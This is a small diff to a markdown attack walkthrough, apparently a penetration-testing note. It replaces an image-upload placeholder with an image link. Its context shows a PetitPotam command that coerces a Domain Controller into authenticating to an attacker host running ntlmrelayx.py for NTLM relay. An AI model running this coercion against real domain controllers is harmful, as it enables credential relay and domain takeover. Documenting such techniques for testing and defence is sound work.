@@ -13,6 +13,7 @@ python3 PetitPotam.py <attack host IP> <Domain Controller IP>
 ```
 to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.
 From ntlmrelayx session
-![Uploading image.png…]()
+![image](https://github.com/user-attachments/assets/2750c8a0-7b15-4402-bb70-f88862f44684)
+
 
 
